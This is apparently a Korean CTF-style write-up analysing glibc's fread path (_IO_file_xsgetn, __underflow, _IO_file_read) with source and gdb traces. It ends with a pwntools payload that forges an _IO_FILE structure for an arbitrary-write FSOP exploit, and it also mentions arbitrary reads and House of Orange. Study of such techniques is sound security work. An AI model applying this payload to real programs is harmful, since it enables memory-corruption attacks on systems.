```c
int
_IO_file_doallocate (_IO_FILE *fp)
{
  _IO_size_t size;
  char *p;
  struct stat64 st;

  size = _IO_BUFSIZ;
  if (fp->_fileno >= 0 && __builtin_expect (_IO_SYSSTAT (fp, &st), 0) >= 0)
    {
      if (S_ISCHR (st.st_mode))
	{
	  /* Possibly a tty.  */
	  if (
#ifdef DEV_TTY_P
	      DEV_TTY_P (&st) ||
#endif
	      local_isatty (fp->_fileno))
	    fp->_flags |= _IO_LINE_BUF;
	}
#if _IO_HAVE_ST_BLKSIZE
      if (st.st_blksize > 0 && st.st_blksize < _IO_BUFSIZ)
	size = st.st_blksize;
#endif
    }
  p = malloc (size);
  if (__glibc_unlikely (p == NULL))
    return EOF;
  _IO_setb (fp, p, p + size, 1);
  return 1;
}
libc_hidden_def (_IO_file_doallocate)
```

우선 먼저 `_IO_DOALLOCATE()` 매크로의 동작부터 보자면 `_IO_file_doallocate()` 함수로 이어진다  

파일 시스템에 맞춰서 효율적인 크기를 `size`로 정하는데 기본적으로는 8Kb(`_IO_BUFSIZ`)로 정해진다  
TTY 즉 터미널 또는 콘솔 환경이면 `_IO_LINE_BUF` 플래그를 설정한다  

후에 `malloc(size)`로 버퍼 `p`를 할당하게 된다  
할당에 실패하면 EOF를 반환한다  
<br>

---

```c
void
_IO_setb (_IO_FILE *f, char *b, char *eb, int a)
{
  if (f->_IO_buf_base && !(f->_flags & _IO_USER_BUF))
    free (f->_IO_buf_base);
  f->_IO_buf_base = b;
  f->_IO_buf_end = eb;
  if (a)
    f->_flags &= ~_IO_USER_BUF;
  else
    f->_flags |= _IO_USER_BUF;
}
libc_hidden_def (_IO_setb)
```

`_IO_setb()` 함수는 `_IO_doallocbuf()`에서도 사용된다  

할당해서 사용할 버퍼의 시작과 끝을 `_IO_buf_base`와 `_IO_buf_end`에 저장한다 (여기서 `_IO_buf_base`, `_IO_buf_end` 값 생김)  
`malloc`으로 할당된 영역의 주소가 저장된다  

이때 `_IO_doallocbuf()` 함수에서 `IO_DOALLOCATE()`를 실패한 경우에는 파일 스트림 구조체의 1바이트짜리 `_shortbuf` 멤버를 버퍼로 사용한다  

</details>

<br>

---

```c
// /libio/fileops.c

char *s = data;

want = n;

while (want > 0)
    {
      have = fp->_IO_read_end - fp->_IO_read_ptr;

      ...

    }
```

`s`에 `data`를 굳이 한 번 더 옮기는데 이는 `data`를 void 형식으로 받았기 때문이다  
1바이트 단위로 포인터를 다루기 위해 char 형식으로 캐스팅한다  

`want`에는 `n`이 들어가는데 `n`은 `_IO_file_xsgetn()`에서 인자로 받은 읽고 싶은 크기이다  
while 루프를 돌면서 데이터를 읽을 때마다 `want`를 감소시켜서 남은 읽기 요구량을 추적한다  

`have`는 `_IO_read_end`-`_IO_read_ptr`로 읽기 버퍼의 크기로 저장 가능한 크기이다   
`fopen` 이후 아직 아무것도 안 한 경우 `fread()` 호출 이후 처음에는 0으로 설정되어 있어 `have`는 0이다   
<br>

---

이제 while문 내부를 분석해볼건데.. 너무 길어가 어렵고 헷갈리니까 미리 요약부터 해본다  
그냥 사용자가 요청한 크기인 `want`만큼 데이터를 모두 읽기 위한 루프이다  

크게 두 가지로 나뉘는데 Fast Path와 Slow Path가 있다  
버퍼에서 데이터를 충분히 읽을 수 있으면 Fast Path로, 버퍼에 데이터가 부족하면 Slow Path로 간다  
<br>

---

```c
// /libio/fileops.c

if (want <= have)
{
  memcpy (s, fp->_IO_read_ptr, want);
  fp->_IO_read_ptr += want;
  want = 0;
}
```

요 if문이 Fast Path고, 뒤의 else 문이 Slow Path라고 보면 된다  

앞서도 말했는데 첫 루프에서는 `have`가 0이기에 바로 뒤에 else 문으로 빠진다  
> `_IO_read_ptr`, `_IO_read_end` 덮어쓰면 `memcpy()`로 AAR도 가능할 것 같다    

`want`가 `have`보다 작거나 같다면, 즉 읽고 싶은 크기가 읽기 버퍼의 크기보다 작거나 같으면 `s`에 `want`만큼 `_IO_read_ptr`를 복사한다  
여기서 `s`는 `_IO_file_xsgetn()`의 인자로 받은 `data`로, fread한 내용을 저장할 곳이다  
단순히 포인터만 이동시키기에 Fast Path이다  

`_IO_read_ptr`에 `want`만큼 더해서 어디까지 read 했는지 저장해놓고 `want`를 0으로 초기화한다  
<br>

---

```c
// /libio/fileops.c

while (want > 0)
  {
    have = fp->_IO_read_end - fp->_IO_read_ptr;

    ...

    else
      {
        if (have > 0)
          {
            s = __mempcpy (s, fp->_IO_read_ptr, have);
            want -= have;
            fp->_IO_read_ptr += have;
          }
      ...
      }
  ...
  }
```

요 else문은 Slow Path이다  
읽고 싶은 데이터의 크기가 읽기 버퍼보다 작을 때 실행된다  

여기서도 마찬가지로 처음에는 `have`가 0이므로 다음 if문으로 넘어간다    

`have`가 양수이면 `s`에 `_IO_read_ptr`을 `have`만큼 복사한다  
사용자가 요청한 양보다 `have`가 적을 때 일단 이미 읽기 버퍼에 있는 데이터는 다 복사한다  
<br>

---

```c
// /libio/fileops.c

/* Check for backup and repeat */
if (_IO_in_backup (fp))
  {
    _IO_switch_to_main_get_area (fp);
    continue;
  }
```

`fp`가 현재 백업 모드인지 확인하고 백업 버퍼에서 데이터를 읽는데 읽을 버퍼가 부족한 상황에는 `_IO_switch_to_main_get_area()`로 메인 파일 버퍼로 돌아가게 된다    

만약 현재 `ungetc()` 등에 의해 백업 버퍼를 읽고 있던 상태이면 원래 메인 버퍼로 포인터들을 되돌려 놓고 continue로 루프의 처음으로 돌아간다  
<br>

---

```c
// /libio/fileops.c

/* If we now want less than a buffer, underflow and repeat
    the copy.  Otherwise, _IO_SYSREAD directly to
    the user buffer. */
if (fp->_IO_buf_base
    && want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base))
  {
    if (__underflow (fp) == EOF)
break;

    continue;
  }
```

`_IO_buf_base`는 아까 설정되었으니 `want`가 전체 버퍼(`_IO_buf_end`-`_IO_buf_base`)보다 작은지 확인한다  
할당된 버퍼의 크기가 `want`보다 큰지 확인하는 것이다  

여기서 `__underflow()`가 실행되는데 이걸로 FSOP 익스가 진행되므로 후술하겠다..  
남은 요청량 `want`가 전체 버퍼 크기보다 작으면 `__underflow()`를 호출해 빈 버퍼를 시스템에서 채운다  

만약 남은 요청량이 전체 버퍼보다 크면 다음 과정을 수행한다  
<br>

---

```c
// /libio/libioP.h

#define _IO_setg(fp, eb, g, eg)  ((fp)->_IO_read_base = (eb),\
	(fp)->_IO_read_ptr = (g), (fp)->_IO_read_end = (eg))

...

#define _IO_setp(__fp, __p, __ep) \
       ((__fp)->_IO_write_base = (__fp)->_IO_write_ptr \
	= __p, (__fp)->_IO_write_end = (__ep))
```

```c
// /libio/fileops.c

/* These must be set before the sysread as we might longjmp out
    waiting for input. */
_IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);
_IO_setp (fp, fp->_IO_buf_base, fp->_IO_buf_base);
```

`_IO_read_base`, `_IO_read_ptr`, `_IO_read_end`를 `_IO_buf_base`로 설정한다  
`_IO_write_base`, `_IO_write_ptr`, `_IO_write_end`를 `_IO_buf_base`로 설정한다  
<br>

> `_IO_setg()`는 `fp`의 `_IO_read_base`를 `eb`로, `_IO_read_ptr`을 `g`로, `_IO_read_end`를 `eg`로 설정한다  
> `_IO_setp()`는 `__fp`의 `_IO_write_base`와 `_IO_write_ptr`을 `__p`로, `_IO_write_end`를 `__ep`로 설정한다  

<br>

---

```c
// /libio/fileops.c

/* Try to maintain alignment: read a whole number of blocks.  */
count = want;
if (fp->_IO_buf_base)
  {
    _IO_size_t block_size = fp->_IO_buf_end - fp->_IO_buf_base;
    if (block_size >= 128)
count -= want % block_size;
  }

count = _IO_SYSREAD (fp, s, count);
if (count <= 0)
    {
      if (count == 0)
  fp->_flags |= _IO_EOF_SEEN;
      else
  fp->_flags |= _IO_ERR_SEEN;

      break;
    }
```

할당된 버퍼 크기가 128 이상이면 `count`에서 `want` % `block_size`를 뺀다  

`s`에 `fp` 내용을 `count`만큼 직접적으로 데이터를 읽어들인다  

`_IO_SYSREAD()`로 읽은 바이트 수는 `count`에 다시 저장된다   
`count`가 0이면 EOF가 나고 `count`가 0보다 작으면 에러 처리가 된다  
<br>

---

```c
// /libio/fileops.c

s += count;
want -= count;
if (fp->_offset != _IO_pos_BAD)
  _IO_pos_adjust (fp->_offset, count);
```

`s`에 `count`만큼 더해서 읽은 만큼 포인터를 옮기고, `want`에서 `count`를 빼서 읽은 만큼 빼서 포인터를 옮긴다    

`_offset`이 `_IO_post_BAD`면 `_IO_pos_adjust()`가 호출된다  
`_offset`은 현재 파일이 읽기/쓰기 중인 위치를 캐싱하는 용도인데 `_IO_pos_BAD`로 유효하지 않은 값이라면 `_IO_pos_adjust()`를 통해 캐싱된 위치에서 count만큼 더해서 실제 위치와 동기화를 해주는 것이라고 한다  

이제부터 `want`가 0이 되어 요청한 만큼 모두 읽어들일 때까지 루프문을 다시 돌게 된다  
<br>

---

```c
 /* If we now want less than a buffer, underflow and repeat
  the copy.  Otherwise, _IO_SYSREAD directly to
  the user buffer. */
if (fp->_IO_buf_base
    && want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base))
  {
    if (__underflow (fp) == EOF)
break;

    continue;
  }
```

while문 안에 이런 코드가 있었다  
현재 요청량이 버퍼 크기보다 작으면 `__underflow()` 함수를 호출한다  
<br>

---

#### __underflow()

```c
// /libio/genops.c

int
__underflow (_IO_FILE *fp)
{
  if (_IO_vtable_offset (fp) == 0 && _IO_fwide (fp, -1) != -1)
    return EOF;

  if (fp->_mode == 0)
    _IO_fwide (fp, -1); // _mode 검사해서 바이트 지향으로 설정
  if (_IO_in_put_mode (fp))
    if (_IO_switch_to_get_mode (fp) == EOF) // 스트림이 쓰기 작업 중이었다면 읽기 작업을 위해 모드 전환
      return EOF;
  if (fp->_IO_read_ptr < fp->_IO_read_end) // 읽기 버퍼에 읽을 데이터가 생겼는지 한 번 더 확인
    return *(unsigned char *) fp->_IO_read_ptr;
  if (_IO_in_backup (fp))
    {
      _IO_switch_to_main_get_area (fp); // 백업 영역 읽는 중이었다면 메인 영역으로 스위치
      if (fp->_IO_read_ptr < fp->_IO_read_end)
	return *(unsigned char *) fp->_IO_read_ptr;
    }
  if (_IO_have_markers (fp))
    {
      if (save_for_backup (fp, fp->_IO_read_end)) // _marker 있으면 현재 버퍼 상태 백업으로 저장
	return EOF;
    }
  else if (_IO_have_backup (fp))
    _IO_free_backup_area (fp); // _marker 없이 백업 버퍼만 있으면 백업 영역 해제
  return _IO_UNDERFLOW (fp);
}
libc_hidden_def (__underflow)
```

이는 결국 `_IO_UNDERFLOW()`를 호출한다  
<br>

---

```c
#define JUMP0(FUNC, THIS) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS)

...

#define _IO_UNDERFLOW(FP) JUMP0 (__underflow, FP)
```

이전에 `__xsgetn`을 사용하던 것과 비슷한 방식으로 진행된다  
<br>

---

```c
// /libio/fileops.c

const struct _IO_jump_t _IO_file_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_file_finish),
  JUMP_INIT(overflow, _IO_file_overflow),
  JUMP_INIT(underflow, _IO_file_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_default_pbackfail),
  JUMP_INIT(xsputn, _IO_file_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_new_file_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_new_file_setbuf),
  JUMP_INIT(sync, _IO_new_file_sync),
  JUMP_INIT(doallocate, _IO_file_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
libc_hidden_data_def (_IO_file_jumps)
```

`__xsgetn`이 어떤 함수로 점프하는지 찾았던대로 `__underflow`도 똑같이 해보면 일단 `_IO_file_underflow`로 점프하는 것을 알 수 있다  
<br>

---

![Image](/assets/img/251102_0/_IO_file_underflow.png)

실제로 gdb로 디버깅을 해보면 `__underflow` 내에서 `_IO_file_underflow`로 점프한다  
<br>

---

```c
// /libio/fileops.c

versioned_symbol (libc, _IO_new_do_write, _IO_do_write, GLIBC_2_1);
versioned_symbol (libc, _IO_new_file_attach, _IO_file_attach, GLIBC_2_1);
versioned_symbol (libc, _IO_new_file_close_it, _IO_file_close_it, GLIBC_2_1);
versioned_symbol (libc, _IO_new_file_finish, _IO_file_finish, GLIBC_2_1);
versioned_symbol (libc, _IO_new_file_fopen, _IO_file_fopen, GLIBC_2_1);
versioned_symbol (libc, _IO_new_file_init, _IO_file_init, GLIBC_2_1);
versioned_symbol (libc, _IO_new_file_setbuf, _IO_file_setbuf, GLIBC_2_1);
versioned_symbol (libc, _IO_new_file_sync, _IO_file_sync, GLIBC_2_1);
versioned_symbol (libc, _IO_new_file_overflow, _IO_file_overflow, GLIBC_2_1);
versioned_symbol (libc, _IO_new_file_seekoff, _IO_file_seekoff, GLIBC_2_1);
versioned_symbol (libc, _IO_new_file_underflow, _IO_file_underflow, GLIBC_2_1);
versioned_symbol (libc, _IO_new_file_write, _IO_file_write, GLIBC_2_1);
versioned_symbol (libc, _IO_new_file_xsputn, _IO_file_xsputn, GLIBC_2_1);
```

근데 `_IO_file_underflow()` 심볼이 `_IO_new_file_underflow()`로 매칭되어 있으므로 실제로는 `_IO_new_file_underflow()` 함수의 동작을 하게 된다   

실제로 `_IO_file_underflow()` 심볼을 가진 함수에 대한 정의는 찾지 못했다..  
<br>

---

#### _IO_new_file_underflow()

<details markdown="1">
<summary>_IO_new_file_underflow()</summary>

```c
// /libio/fileops.c

int
_IO_new_file_underflow (_IO_FILE *fp)
{
  _IO_ssize_t count;
#if 0
  /* SysV does not make this test; take it out for compatibility */
  if (fp->_flags & _IO_EOF_SEEN)
    return (EOF);
#endif

  if (fp->_flags & _IO_NO_READS)
    {
      fp->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  if (fp->_IO_read_ptr < fp->_IO_read_end)
    return *(unsigned char *) fp->_IO_read_ptr;

  if (fp->_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp->_IO_save_base != NULL)
	{
	  free (fp->_IO_save_base);
	  fp->_flags &= ~_IO_IN_BACKUP;
	}
      _IO_doallocbuf (fp);
    }

  /* Flush all line buffered files before reading. */
  /* FIXME This can/should be moved to genops ?? */
  if (fp->_flags & (_IO_LINE_BUF|_IO_UNBUFFERED))
    {
#if 0
      _IO_flush_all_linebuffered ();
#else
      /* We used to flush all line-buffered stream.  This really isn't
	 required by any standard.  My recollection is that
	 traditional Unix systems did this for stdout.  stderr better
	 not be line buffered.  So we do just that here
	 explicitly.  --drepper */
      _IO_acquire_lock (_IO_stdout);

      if ((_IO_stdout->_flags & (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))
	  == (_IO_LINKED | _IO_LINE_BUF))
	_IO_OVERFLOW (_IO_stdout, EOF);

      _IO_release_lock (_IO_stdout);
#endif
    }

  _IO_switch_to_get_mode (fp);

  /* This is very tricky. We have to adjust those
     pointers before we call _IO_SYSREAD () since
     we may longjump () out while waiting for
     input. Those pointers may be screwed up. H.J. */
  fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
  fp->_IO_read_end = fp->_IO_buf_base;
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end
    = fp->_IO_buf_base;

  count = _IO_SYSREAD (fp, fp->_IO_buf_base,
		       fp->_IO_buf_end - fp->_IO_buf_base);
  if (count <= 0)
    {
      if (count == 0)
	fp->_flags |= _IO_EOF_SEEN;
      else
	fp->_flags |= _IO_ERR_SEEN, count = 0;
  }
  fp->_IO_read_end += count;
  if (count == 0)
    {
      /* If a stream is read to EOF, the calling application may switch active
	 handles.  As a result, our offset cache would no longer be valid, so
	 unset it.  */
      fp->_offset = _IO_pos_BAD;
      return EOF;
    }
  if (fp->_offset != _IO_pos_BAD)
    _IO_pos_adjust (fp->_offset, count);
  return *(unsigned char *) fp->_IO_read_ptr;
}
libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)
```

</details>

```c
// /libio/fileops.c

if (fp->_flags & _IO_NO_READS)
{
  fp->_flags |= _IO_ERR_SEEN;
  __set_errno (EBADF);
  return EOF;
}
```

플래그 비트에 `_IO_NO_READS(0x4)`가 설정되어 있는지 확인한다  

`_IO_NO_READS`는 읽기 권한이 존재하는지 여부를 알려주는 플래그인데 읽기 금지된 파일에서 읽을 수는 없기 때문에 `_IO_NO_READS` 플래그를 검사한다  

읽기 금지된 파일을 읽으려고 시도한다면 `_IO_ERR_SEEN` 플래그를 설정해 에러가 발생했다는 정보를 기록하고 `errno`를 EBADF로 설정한다  
`errno`는 시스템 전역 에러 변수이고 EBADF는 Bad File Descriptor를 의미한다  
<br>

---

```c
// /libio/fileops.c

if (fp->_IO_read_ptr < fp->_IO_read_end)
  return *(unsigned char *) fp->_IO_read_ptr;
```

`_IO_read_ptr`이 `_IO_read_end`보다 작으면 `_IO_read_ptr`을 반환한다  
읽기 버퍼에 공간이 남아있으면 굳이 커널에 데이터를 요청할 필요가 없기 때문에 현재 `_IO_read_ptr`이 가리키는 첫번째 1바이트를 반환하고 함수를 종료한다  
<br>

---

```c
// /libio/fileops.c

if (fp->_IO_buf_base == NULL)
  {
    /* Maybe we already have a push back pointer.  */
    if (fp->_IO_save_base != NULL)
{
  free (fp->_IO_save_base);
  fp->_flags &= ~_IO_IN_BACKUP;
}
    _IO_doallocbuf (fp);
  }
```

`_IO_file_xsgetn()` 함수에도 있던 코드 로직이다  
<br>

---

```c
// /libio/fileops.c

/* Flush all line buffered files before reading. */
/* FIXME This can/should be moved to genops ?? */
if (fp->_flags & (_IO_LINE_BUF|_IO_UNBUFFERED))
{
#if 0
   _IO_flush_all_linebuffered ();
#else
 /* We used to flush all line-buffered stream.  This really isn't
 required by any standard.  My recollection is that
 traditional Unix systems did this for stdout.  stderr better
 not be line buffered.  So we do just that here
 explicitly.  --drepper */
  _IO_acquire_lock (_IO_stdout);

  if ((_IO_stdout->_flags & (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))
  == (_IO_LINKED | _IO_LINE_BUF))
  _IO_OVERFLOW (_IO_stdout, EOF);

  _IO_release_lock (_IO_stdout);
#endif
}

_IO_switch_to_get_mode (fp);
```

플래그에 `_IO_LINE_BUF` 또는 `_IO_UNBUFFERED`가 설정되어 있는지 확인한다  
현재 읽으려는 파일 스트림이 줄 단위 버퍼링이거나 버퍼링을 안 하는 상태인지 확인하는데 주로 터미널에서 입력을 받으면 참이 된다  

`_IO_stdout`에 락을 걸어놓고 `_IO_stdout`의 플래그에 `_IO_LINKED`, `_IO_NO_WRITES` 또는 `_IO_LINE_BUF`가 설정되어 있는지 검사한다  
이는 `stdout`이 쓰기 가능하고 줄 단위 버퍼링이 켜져 있는지 검사한다  
참이 되면 `_IO_OVERFLOW()`로 `stdout`의 버퍼에 남아 있는 데이터를 Flush해서 출력한다  

후에 락을 풀고 다시 스트림으로 돌아와 `fp` 내부 포인터를 재정렬한다  
<br>

> 여기서 `_IO_stdout` 구조체 멤버를 조작할 수 있다면 `stdout`의 vtable을 덮어써서 공격하는 기법도 존재한다   
> 관련: **House of Orange**  

<br>

---

```c
// /libio/fileops.c

/* This is very tricky. We have to adjust those
    pointers before we call _IO_SYSREAD () since
    we may longjump () out while waiting for
    input. Those pointers may be screwed up. H.J. */
fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
fp->_IO_read_end = fp->_IO_buf_base;
fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end
  = fp->_IO_buf_base;

count = _IO_SYSREAD (fp, fp->_IO_buf_base,
          fp->_IO_buf_end - fp->_IO_buf_base);
```

`_IO_read_base`와 `_IO_read_ptr`에 `_IO_buf_base` 값을 저장한다  
`_IO_read_end`에는 `_IO_buf_base`를 저장한다  
`_IO_write_base`, `_IO_write_ptr`과 `_IO_write_end`에는 `_IO_buf_base`를 저장한다  

결국에는 다 `_IO_buf_base`로 바꿔버린다  

여기서 `_IO_SYSREAD`에 인자들이 들어가는데 여기서 AAW를 터트릴 수 있게 된다    
<br>

---

#### _IO_SYSREAD()

```c
// /libio/libioP.h

#define _IO_SYSREAD(FP, DATA, LEN) JUMP2 (__read, FP, DATA, LEN)
```

아까와 같다..  
`_IO_file_jumps libio_vtable`을 확인하면 `_IO_file_read`를 호출하는 것을 볼 수 있다  
<br>

---

![Image](/assets/img/251102_0/_IO_file_read.png)

마찬가지로 gdb로 확인해서 확정 지을 수 있다  
<br>

---

#### _IO_file_read()

```c
// /libio/fileops.c

_IO_ssize_t
_IO_file_read (_IO_FILE *fp, void *buf, _IO_ssize_t size)
{
  return (__builtin_expect (fp->_flags2 & _IO_FLAGS2_NOTCANCEL, 0)
	  ? __read_nocancel (fp->_fileno, buf, size)
	  : __read (fp->_fileno, buf, size));
}
libc_hidden_def (_IO_file_read)
```

`_flags2` 확인 후 내부적으로 또 `__read()` 함수를 호출한다  
이때 인자로는 `fp`가 아닌 `fp` 구조체의 `_fileno` 멤버가 들어간다  
<br>

---

![Image](/assets/img/251102_0/read.png)

여기서의 `__read()`는 `read()`로 점프한다  
사실 이 부분은 코드에서 확인하지는 못했고 gdb로만 확인했다..  

이전에 gdb로 확인했던 것들도 코드로 완벽하게 확인하지는 못했지만 어찌 됐든 gdb로 동적 디버깅해서 직접 동작 확인하는게 정확하긴 하니까..  
<br>

---

![Image](/assets/img/251102_0/flag.png)

그래서 이렇게 실행되는 `fread()` 속에 들어가는 파일 구조체를 조작하여 `read()`를 사용하면 AAW가 가능하다  
이를 위해서는 앞서 제대로 분석하지 않았던 플래그 검증이나 다른 `fp` 멤버 확인 조건문들을 만족시킬 건 만족시키고, 빠질 건 빠져야 한다  
<br>

---

### Exploit

#### _IO_SYSREAD 실행을 위한 조건 우회

`fread()` 함수를 실행했을 때 결국 `read()` 함수가 호출되도록 해야 하는데, `_IO_SYSREAD`에서 `read()`로 가는 플로우에 `_IO_FILE` 구조체 멤버 검증 과정이 없기 때문에 `_IO_new_file_underflow()` 함수에서 `_IO_SYSREAD`가 실행되도록 하기 위한 조건만 맞춰주면 된다  
<br>

그리고 해당 문제에서는 일단 `fread()`를 정상적으로 실행할 필요는 없고 AAW로 스택에 위치한 지역 변수 하나만 조작하면 플래그가 뽑히는 문제이다  
따라서, `_IO_SYSREAD` 이후의 조건까지 맞춰줄 필요가 없다  
<br>

---

```c
if (fp->_flags & _IO_NO_READS)
  {
    fp->_flags |= _IO_ERR_SEEN;
    __set_errno (EBADF);
    return EOF;
  }
```

`_flags` 플래그 비트에 `_IO_NO_READS`가 포함되어 있으면 EOF로 빠지므로 읽기 권한이 설정되어 있어야 한다  
<br>

<details markdown="1">
<summary>플래그 비트</summary>

```c
// /libio/bits/libio.h

#define _IO_MAGIC 0xFBAD0000 /* Magic number */
#define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */
#define _IO_MAGIC_MASK 0xFFFF0000
#define _IO_USER_BUF 1 /* User owns buffer; don't delete it on close. */
#define _IO_UNBUFFERED 2
#define _IO_NO_READS 4 /* Reading not allowed */
```

플래그 비트는 `/libio/bits/libio.h`{: filepath}에 정의되어 있다  

</details>
<br>

---

```c
if (fp->_IO_read_ptr < fp->_IO_read_end)
  return *(unsigned char *) fp->_IO_read_ptr;

if (fp->_IO_buf_base == NULL)
  {
    /* Maybe we already have a push back pointer.  */
    if (fp->_IO_save_base != NULL)
{
  free (fp->_IO_save_base);
  fp->_flags &= ~_IO_IN_BACKUP;
}
    _IO_doallocbuf (fp);
  }
```

`_IO_read_ptr`이 `_IO_read_end`보다 크거나 같아야 하고, `_IO_buf_base`가 NULL 값이면 안 된다  
<br>

---

```c
  if (fp->_flags & (_IO_LINE_BUF|_IO_UNBUFFERED))
    {
#if 0
      _IO_flush_all_linebuffered ();
#else
      /* We used to flush all line-buffered stream.  This really isn't
	 required by any standard.  My recollection is that
	 traditional Unix systems did this for stdout.  stderr better
	 not be line buffered.  So we do just that here
	 explicitly.  --drepper */
      _IO_acquire_lock (_IO_stdout);

      if ((_IO_stdout->_flags & (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))
	  == (_IO_LINKED | _IO_LINE_BUF))
	_IO_OVERFLOW (_IO_stdout, EOF);

      _IO_release_lock (_IO_stdout);
#endif
    }
```

플래그 비트에 `_IO_LINE_BUF`와 `_IO_UNBUFFERED`가 설정되어 있지 않아야 한다  
<br>

<details markdown="1">
<summary>플래그 비트</summary>

```c
// /libio/bits/libio.h

#define _IO_UNBUFFERED 2
#define _IO_NO_READS 4 /* Reading not allowed */
#define _IO_NO_WRITES 8 /* Writing not allowd */
#define _IO_EOF_SEEN 0x10
#define _IO_ERR_SEEN 0x20
#define _IO_DELETE_DONT_CLOSE 0x40 /* Don't call close(_fileno) on cleanup. */
#define _IO_LINKED 0x80 /* Set if linked (using _chain) to streambuf::_list_all.*/
#define _IO_IN_BACKUP 0x100
#define _IO_LINE_BUF 0x200
```

</details>
<br>

---

```c
// /libio/genops.c

int
_IO_switch_to_get_mode (_IO_FILE *fp)
{
  if (fp->_IO_write_ptr > fp->_IO_write_base)
    if (_IO_OVERFLOW (fp, EOF) == EOF)
      return EOF;
  if (_IO_in_backup (fp))
    fp->_IO_read_base = fp->_IO_backup_base;
  else
    {
      fp->_IO_read_base = fp->_IO_buf_base;
      if (fp->_IO_write_ptr > fp->_IO_read_end)
	fp->_IO_read_end = fp->_IO_write_ptr;
    }
  fp->_IO_read_ptr = fp->_IO_write_ptr;

  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end = fp->_IO_read_ptr;

  fp->_flags &= ~_IO_CURRENTLY_PUTTING;
  return 0;
}
libc_hidden_def (_IO_switch_to_get_mode)
```

`_IO_switch_to_get_mode()`함수를 호출하는데 이 함수에 대한 정의는 `/libio/genops.c`{: .filepath}에 정의되어 있다  

`_IO_write_ptr`이 `_IO_write_base` 보다 작거나 같아야 한다  

나머지는 딱히 EOF로 리턴되거나 하지도 않고, `SYSREAD`에 인자로 들어가지 않는 값들을 조작하는 로직이라 딱히 신경 쓸 필요는 없다  
<br>

---

#### read()로 AAW

```c
/* This is very tricky. We have to adjust those
     pointers before we call _IO_SYSREAD () since
     we may longjump () out while waiting for
     input. Those pointers may be screwed up. H.J. */
  fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
  fp->_IO_read_end = fp->_IO_buf_base;
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end
    = fp->_IO_buf_base;

  count = _IO_SYSREAD (fp, fp->_IO_buf_base,
		       fp->_IO_buf_end - fp->_IO_buf_base);
```

`_IO_SYSREAD` 즉 플로우에 이어 실행될 `read()` 함수의 인자로 `fp->_fineno`, `_IO_buf_base`, `_IO_buf_end`-`_IO_buf_base`가 들어간다  

(앞서 `_IO_file_read()` 함수에서 `fp`가 인자로 그대로 들어가지 않고 `_fileno` 멤버가 들어가는 것을 확인했다)  
<br>

---

```c
ssize_t read(int fd, void *buf, size_t count);
```

`read()` 함수의 프로토타입이다  
알고 있듯이 `buf` 공간에 `fd`의 내용을 `count` 만큼 집어넣게 된다  

그러면 결국 `fp->_filno`의 내용을 `_IO_buf_base`가 가리키는 공간에 `_IO_buf_end`-`_IO_buf_base` 길이 만큼 쓰게 된다  

여기서 `_fileno`까지 stdin을 나타내는 0으로 설정해주면 내가 입력한 값을 특정 주소로 AAW가 가능하다  
<br>

---

근데 다시 중요하게 봐야 할 조건이 하나 더 있다  

```c
// /libio/fileops.c

_IO_size_t
_IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n)
{
  _IO_size_t want, have;
  _IO_ssize_t count;
  char *s = data;

  want = n;

...

  /* If we now want less than a buffer, underflow and repeat
  the copy.  Otherwise, _IO_SYSREAD directly to
  the user buffer. */
if (fp->_IO_buf_base
    && want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base))
  {
    if (__underflow (fp) == EOF)
break;

    continue;
  }

...

}
```

`__underflow`가 실행되기 위해서는 `IO_buf_base`가 존재하고, `want` 값이 `_IO_buf_end`-`_IO_buf_base`보다 크거나 같아야 한다  

`want`는 인자로 받은 `n`인데 이 값은 `fread()` 함수에서 두번째 인자와 세번째 인자를 곱한 값이다  

본 문제에서는 1023이기에 `_IO_buf_end`-`_IO_buf_base`의 값이 1023 이상이 되도록 만들면 된다  
<br>

---

#### Payload

```python
_flags = 0xfbad0000,
_IO_read_ptr = 0x0,
_IO_read_end = 0x0,
_IO_read_base = 0x0,
_IO_write_base = 0x0,
_IO_write_ptr = 0x0,
_IO_write_end = 0x0,
_IO_buf_base = target, # overwrite_me
_IO_buf_end = target+1024, # buffer size >= 1024
_IO_save_base = 0x0,
_IO_backup_base = 0x0,
_IO_save_end = 0x0,
_markers = 0x0,
_chain = 0x0,
_fileno = 0x0, # stdin

payload = flat(
    _flags,
    _IO_read_ptr, _IO_read_end, _IO_read_base,
    _IO_write_base, _IO_write_ptr, _IO_write_end,
    _IO_buf_base, _IO_buf_end,
    _IO_save_base, _IO_backup_base, _IO_save_end,
    _markers, _chain, _fileno
)
```

pwntools에 있는 `FileStructure`을 사용하려 했으나 일부분만 덮어야 해서 보류한다  
쓰려면 잘라서 쓸 수 있겠지만 굳이..  

정리하면 다음과 같다  

- `_IO_buf_base` : 덮어쓸 주소  
